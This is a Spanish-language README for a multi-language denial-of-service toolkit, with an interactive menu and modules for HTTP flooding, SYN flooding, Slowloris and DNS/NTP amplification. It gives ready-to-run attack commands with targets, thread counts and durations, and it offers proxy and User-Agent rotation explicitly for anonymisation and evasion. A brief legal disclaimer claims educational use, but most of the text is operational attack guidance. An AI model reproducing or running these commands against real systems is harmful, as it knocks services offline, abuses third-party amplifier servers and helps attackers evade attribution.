# DoS-Toolkit - Multi-Language Denial of Service Framework

Framework profesional de ataques DoS multi-lenguaje con CLI centralizado, módulos core reutilizables y documentación completa.

## 🎯 Características Principales

- **CLI Centralizado**: Menú interactivo en español para ejecutar ataques desde cualquier lenguaje
- **Multi-Lenguaje**: Python, Go, Rust, C/C++
- **5 Tipos de Ataques**:
  - HTTP-Flood
  - SYN-Flood
  - Slowloris
  - UDP-Amplification
  - Proxy Utils
- **Módulos Core Reutilizables**: Código compartido entre lenguajes
- **Documentación Completa**: README en cada módulo

## 🚀 Inicio Rápido

### Instalación

```bash
# Clonar o descargar el proyecto
cd DoS-Toolkit

# Instalar dependencias de Python (opcional)
cd python
pip install -r requirements.txt
cd ..
```

### Uso Principal

```bash
# Ejecutar CLI centralizado
python cli.py
```

**Menú interactivo:**
```
╔══════════════════════════════════════════════════════════��═════╗
║                    DoS-TOOLKIT v1.0                           ║
║              Multi-Language Denial of Service                 ║
║                                                                ║
║  Python | Go | Rust | C/C++                                   ║
╚════════════════════════════════════════════════════════════════╝

[*] Selecciona el lenguaje de ejecución:

    1. Python
    2. Go
    3. Rust
    4. C/C++
    0. Salir
```

## 📁 Estructura del Proyecto

```
DoS-Toolkit/
├── cli.py                    # CLI principal centralizado
├── README.md                 # Este archivo
│
├── python/                   # Implementación Python
│   ├── attacks.py           # Controlador de ataques
│   ├── core/
│   │   ├── http_flood.py
│   │   ├── syn_flood.py
│   │   ├── slowloris.py
│   │   ├── udp_amp.py
│   │   └── utils_proxy.py
│   ├── requirements.txt
│   └── README.md
│
├── go/                       # Implementación Go
│   ├── attacks.go
│   ├── core/
│   │   ├── http_flood.go
│   │   ├── syn_flood.go
│   │   ├── slowloris.go
│   │   ├── udp_amp.go
│   │   └── utils_proxy.go
│   ├── go.mod
│   └── README.md
│
├── rust/                     # Implementación Rust
│   ├── main.rs
│   ├── src/
│   │   ├── http_flood.rs
│   │   ├── syn_flood.rs
│   │   ├── slowloris.rs
│   │   └── udp_amp.rs
│   ├── Cargo.toml
│   └── README.md
│
└── c_cpp/                    # Implementación C/C++
    ├── http_flood.c
    ├── syn_flood.c
    ├── slowloris.c
    ├── udp_amp.c
    ├── Makefile
    └── README.md
```

## 🔧 Uso por Lenguaje

### Python

```bash
# Desde CLI
python cli.py
# Seleccionar: 1 (Python) → Tipo de ataque → Parámetros

# Directo
python python/attacks.py --attack http_flood --target 192.168.1.1 --port 80 --threads 50 --duration 60
```

### Go

```bash
# Desde CLI
python cli.py
# Seleccionar: 2 (Go) → Tipo de ataque → Parámetros

# Directo
cd go && go run attacks.go --attack http_flood --target 192.168.1.1 --port 80 --threads 50 --duration 60
```

### Rust

```bash
# Desde CLI
python cli.py
# Seleccionar: 3 (Rust) → Tipo de ataque → Parámetros

# Directo
cd rust && cargo run --release -- --attack http_flood --target 192.168.1.1 --port 80 --threads 50 --duration 60
```

### C/C++

```bash
# Desde CLI
python cli.py
# Seleccionar: 4 (C/C++) → Tipo de ataque → Parámetros

# Directo
cd c_cpp && make && ./http_flood 192.168.1.1 80 50 60
```

## 📊 Tipos de Ataques

### 1. HTTP-Flood
Envía múltiples solicitudes HTTP GET/POST al objetivo.
- **Velocidad**: Muy rápido
- **Efectividad**: Alta contra servidores sin protección
- **Requisitos**: Ninguno especial

### 2. SYN-Flood
Inunda con paquetes SYN malformados para abrumar la tabla de conexiones.
- **Velocidad**: Muy rápido
- **Efectividad**: Alta
- **Requisitos**: Permisos de administrador/root

### 3. Slowloris
Mantiene conexiones HTTP abiertas indefinidamente.
- **Velocidad**: Lento (intencional)
- **Efectividad**: Alta contra servidores con límite de conexiones
- **Requisitos**: Ninguno especial

### 4. UDP-Amplification
Explota servidores DNS/NTP para amplificar tráfico.
- **Velocidad**: Muy rápido
- **Efectividad**: Muy alta (amplificación)
- **Requisitos**: Acceso a servidores amplificadores

### 5. Proxy Utils
Herramientas para rotación de proxies, IPs y User-Agents.
- **Uso**: Anonimización y evasión
- **Características**: Rotación automática, prueba de proxies

## 🔐 Parámetros Comunes

```
--attack      Tipo de ataque (http_flood, syn_flood, slowloris, udp_amplification)
--target      IP o dominio objetivo (requerido)
--port        Puerto objetivo (default 80)
--threads     Número de threads (default 100)
--duration    Duración en segundos (default 60)
```

## 📝 Ejemplos

### HTTP-Flood contra servidor web
```bash
python cli.py
# O directo:
python python/attacks.py --attack http_flood --target example.com --port 80 --threads 100 --duration 120
```

### SYN-Flood contra servidor
```bash
python python/attacks.py --attack syn_flood --target 192.168.1.1 --port 443 --threads 200 --duration 60
```

### Slowloris contra servidor Apache
```bash
python python/attacks.py --attack slowloris --target 10.0.0.1 --port 8080 --threads 50 --duration 300
```

### UDP-Amplification DNS
```bash
python python/attacks.py --attack udp_amplification --target 192.168.1.100 --port 53 --threads 300 --duration 120
```

## ⚠️ Advertencia Legal

**USO SOLO CON FINES EDUCATIVOS Y AUTORIZADOS**

Este toolkit está diseñado para:
- ✅ Pruebas de seguridad autorizadas
- ✅ Investigación académica
- ✅ Laboratorios de seguridad
- ✅ Defensa de infraestructura propia

**Prohibido:**
- ❌ Ataques no autorizados
- ❌ Daño a sistemas ajenos
- ❌ Uso malicioso

El uso no autorizado es **ILEGAL** y puede resultar en:
- Cargos criminales
- Multas significativas
- Encarcelamiento

## 🛠️ Requisitos

### Python
- Python 3.6+
- requests
- urllib3

### Go
- Go 1.16+

### Rust
- Rust 1.50+
- Cargo

### C/C++
- GCC/Clang
- Make
- libpthread

## 📚 Documentación Adicional

- [Python README](python/README.md)
- [Go README](go/README.md)
- [Rust README](rust/README.md)
- [C/C++ README](c_cpp/README.md)

## 🤝 Contribuciones

Las contribuciones son bienvenidas. Por favor:
1. Fork el proyecto
2. Crea una rama para tu feature
3. Commit tus cambios
4. Push a la rama
5. Abre un Pull Request

## 📄 Licencia

Educativo - Uso responsable

## 👨‍💻 Autor

DoS-Toolkit Development Team

## 📞 Soporte

Para reportar bugs o sugerencias, abre un issue en el repositorio.

---

**Recuerda**: La seguridad es responsabilidad de todos. Usa este toolkit responsablemente.
